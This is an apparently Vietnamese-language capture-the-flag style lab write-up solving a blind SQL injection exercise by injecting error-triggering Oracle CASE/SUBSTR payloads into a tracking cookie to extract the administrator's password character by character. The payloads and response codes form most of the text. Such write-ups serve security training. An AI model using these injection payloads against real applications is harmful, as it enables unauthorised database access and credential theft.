# **Lab: Blind SQL injection with conditional errors**

>  This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. 

>  The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message. 

 > The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user. 

 >  To solve the lab, log in as the `administrator` user. 

# **Solution**

Thử kiểm tra qua trang web, ta thấy khi chèn sql qua URL hay sửa đổi giá trị của TrackingId đều không có thay đổi rõ ràng có thể thấy được.

Trường hợp này nên hướng đến sử dụng câu lệnh case chứa tác nhân gây lỗi cho database.

Tập trung khai thác ở phần cookie, sửa đổi giá trị TrackingId.

```
TrackingId=5ZF6pGT6mrcvPY4N
```

Bắt đầu thử thay đổi giá trị của `TrackingId`

```
TrackingId=5ZF6pGT6mrcvPY4Nss
```

Ta thấy khi thay đổi giá trị của `TrackingId` thì không có gì thay đổi trong response.

Thử gây lỗi trong cú pháp SQL:

```
TrackingId=5ZF6pGT6mrcvPY4N'
```

Khi thừa ra một dấu `'` trong câu truy vấn đã gây ra lỗi cú pháp ở backend và trả về mã lỗi 500.

```
TrackingId=5ZF6pGT6mrcvPY4N'|| (SELECT 'A') ||'
```

Sử dụng toán tử nối chuỗi `||` để thêm một lệnh `SELECT` thì thấy không hoạt động, có thể database là Oracle nên cần thêm FROM trong câu truy vấn.

```
TrackingId=5ZF6pGT6mrcvPY4N'|| (SELECT 'A' FROM DUAL) ||'
```

Đúng như suy đoán thì nó đã hoạt động, `response code = 200`.  
Tiếp theo cần xác nhận bảng users tồn tại.

```
TrackingId=5ZF6pGT6mrcvPY4N'|| (SELECT '' FROM random_table_name WHERE ROWNUM=1) ||'
-> 500
```

```
TrackingId=5ZF6pGT6mrcvPY4N'|| (SELECT '' FROM users WHERE ROWNUM=1) ||'
-> 200
```

Vì database là Oracle nên cần thêm điều kiện `WHERE ROWNUM=1` trong câu truy vấn nếu không thì Oracle sẽ không thực hiện câu truy vấn này và trả về lỗi.

Và dựa theo response code ta xác định được bảng uses tồn tại.  
Tiếp theo đó thì cần xác nhận 2 cột `username` và `password`.

```
TrackingId=5ZF6pGT6mrcvPY4N'|| (SELECT username FROM users WHERE ROWNUM=1) ||'
-> 200
```

```
TrackingId=5ZF6pGT6mrcvPY4N'|| (SELECT password FROM users WHERE ROWNUM=1) ||'
-> 200
```

Vậy là bảng `users` cũng tồn tại 2 cột tên là `username` và `password`.

Tiếp theo thì vẫn như phần trước, mình sẽ vần dùng `CASE` để kiểm tra điều kiện và kiểm tra mã lỗi để lấy kết quả. Cụ thể thì:

```
'|| (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE ROWNUM=1) ||'
-> 500
```

```
'|| (SELECT CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE ROWNUM=1) ||'
-> 200
```

Okeyy, vậy là với phần truy vấn này ta có thể bắt đầu quá trình dò đoán. Bắt đầu với tên user nào..

```
'|| (SELECT CASE WHEN (LENGTH(username)=0) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE ROWNUM=1) ||'
```

Đoạn truy vấn trên dùng để kiểm tra độ dài của `username` nằm hảng 1 trong bảng `users`. Bằng việc thay đổi giá trị so sánh trong `WHEN` tới khi mã response là 500 thì đó là độ dài chính xác.

Yayyy, độ dài `username` này là 15

```
'|| (SELECT CASE WHEN (SUBSTR(username,1,1)='a') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE ROWNUM=1) ||'
-> 500
```

```
'|| (SELECT CASE WHEN (SUBSTR(username,2,1)='a') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE ROWNUM=1) ||'
-> 200
```

Để giải thích chi tiết, mình đang kiểm tra ký tự đầu tiên của hàng đầu tiên cột `username` trong bảng `users` có phải là `'a'` hay không. Nếu đúng thì `response code = 500`, nếu sai thì `response code = 200`. Từ việc thay đổi giá trị vị trí trong `SUBSTR()` và ký tự dùng để so sánh ta có thể dò ra `username` đầu tiên trong bảng `users`.

Vậy là qua quá trình Bruteforce trên thì ta lấy được tên `username` là `administrator`.

Có thể lặp lại phương pháp trên để tìm ra các username khác trong bảng `users`. Cần Count để tìm ra số lượng record có trong bảng và thay đổi giá trị ROWNUM để tìm ra từng `username`.  

Thực tế thì cũng có thể dùng phương pháp tương tự để tìm ra tên bảng users được chứa trong `all_tables` và tìm ra tên các cột bằng việc truy xuất vào `all_tab_columns`.  
Nhưng vì làm vậy thì wripteup sẽ khá dài :v

Vừa làm vừa viết writeup mà cái lab bị timeout mấy lần rồi, tui lười=)))

Okey tiếp tục nào. Vì mục tiêu của lab là chiếm tài khoàn `administrator` nên mình sẽ bỏ qua vụ tìm các username khác.

Tiếp theo là dò mật khẩu thui. Tương tự như việc bruteforce `username` thôi:

```
'|| (SELECT CASE WHEN (LENGTH(password)=0) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE ROWNUM=1) ||'
```

```
'|| (SELECT CASE WHEN (SUBSTR(password,1,1)='a') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE ROWNUM=1) ||'
```

> password length = 20  
password = 1d37m9u6bppq8rb11w3l

DONE :)

![image](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQiY5aOykC5OBcA5PeP5OeITBAx6s3vKlaKxDzau__KSljFdm5dSO-PR84I-5uXy0OoBqE&usqp=CAU)